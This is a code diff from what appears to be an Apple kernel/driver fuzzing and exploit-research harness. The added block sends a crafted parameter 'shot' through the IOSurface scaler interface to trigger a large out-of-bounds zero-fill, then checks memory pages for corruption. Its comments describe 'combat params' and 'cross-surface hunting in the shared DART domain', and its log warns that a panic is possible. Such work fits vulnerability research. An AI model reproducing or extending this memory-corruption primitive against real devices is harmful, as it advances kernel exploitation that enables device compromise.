@@ -16764,6 +16764,42 @@ static void p_xywrap(void) {
     size_t total = (size_t)IOSurfaceGetAllocSize(gd);
     uint8_t *gbase = (uint8_t *)IOSurfaceGetBaseAddress(gd);
 
+    // single custom-parameter shot (combat params from scaler_dva_formula §8):
+    // FUZZ_XYWRAP_X/Y/W/H override — e.g. X=0 Y=0 W=0x80 H=0x1000 = max-span
+    // forward zero-fill (~64MB from dst base) for cross-surface hunting in the
+    // shared DART domain.
+    const char *eX = getenv("FUZZ_XYWRAP_X"), *eY = getenv("FUZZ_XYWRAP_Y");
+    if (eX || eY) {
+        uint32_t X = eX ? (uint32_t)strtoul(eX, NULL, 0) : 0;
+        uint32_t Y = eY ? (uint32_t)strtoul(eY, NULL, 0) : 0;
+        const char *eW = getenv("FUZZ_XYWRAP_W"), *eH = getenv("FUZZ_XYWRAP_H");
+        uint32_t W = eW ? (uint32_t)strtoul(eW, NULL, 0) : 0x80;
+        uint32_t H = eH ? (uint32_t)strtoul(eH, NULL, 0) : 0x400;
+        if (IOSurfaceLock(gd, 0, NULL) == 0) {
+            for (size_t p = 0; p + 0x1000 <= total; p += 0x1000)
+                memset(gbase + p, (int)((p >> 12) & 0xff), 0x1000);
+            IOSurfaceUnlock(gd, 0, NULL);
+        }
+        LOG("[xyw] custom shot X=0x%08x Y=0x%08x W=0x%08x H=0x%08x (PANIC possible)", X, Y, W, H);
+        fsync(fileno(stderr));
+        border_payload(req, gsi, gdi, X, Y, W, H, 32, 32);
+        kern_return_t kr = scaler_call1(c, req);
+        usleep(1000000);
+        long bad = 0; size_t first = 0, last = 0;
+        if (IOSurfaceLock(gd, kIOSurfaceLockReadOnly, NULL) == 0) {
+            for (size_t p = 0; p + 0x1000 <= total; p += 0x1000) {
+                int cnt = 0;
+                for (size_t i = p; i < p + 0x1000; i += 4)
+                    if (*(uint32_t *)(gbase + i) != (0x01010101u * ((p >> 12) & 0xff))) cnt++;
+                if (cnt) { if (!bad) first = p; last = p; bad += cnt; }
+            }
+            IOSurfaceUnlock(gd, kIOSurfaceLockReadOnly, NULL);
+        }
+        LOG("[xyw] custom -> kr 0x%08x | bad qwords %ld, pages 0x%zx..0x%zx", kr, bad, first, last);
+        LOG("[xyw] custom done (alive)");
+        return;
+    }
+
     static const uint32_t cands[] = { 0xFFFFFFF0, 0xFFFFFF00, 0xFFFFF000, 0xFFFF0000,
                                       0xFF000000, 0xF0000000, 0xC0000000, 0x80000000,
                                       0x40000000, 0x10000000 };
